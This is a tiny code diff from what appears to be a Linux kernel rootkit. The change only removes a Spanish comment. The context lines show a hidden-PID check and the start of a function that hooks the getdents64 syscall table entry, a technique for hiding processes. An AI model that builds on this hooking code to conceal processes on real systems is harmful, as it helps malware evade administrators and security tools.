@@ -69,7 +69,6 @@ int is_pid_hidden(const char *name)
     return 0;
 }
 
-/* Registro y desregistro */
 void enable_getdents64_hook(unsigned long **syscall_table)
 {
     original_getdents64 = (void *)syscall_table[__NR_getdents64];
